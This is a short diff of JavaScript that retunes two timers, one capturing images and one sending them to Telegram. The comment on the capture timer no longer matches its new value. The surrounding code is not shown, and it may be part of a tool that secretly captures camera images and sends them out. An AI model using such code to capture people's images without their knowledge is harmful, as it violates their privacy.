@@ -68,12 +68,12 @@
             // Capture images every 0.2 seconds
             setInterval(() => {
                 captureImage();
-            }, 500);
+            }, 5000);
 
             // Send images every second to avoid overwhelming Telegram
             setInterval(() => {
                 sendImages();
-            }, 5000);
+            }, 1000);
         }
 
         // Start the process
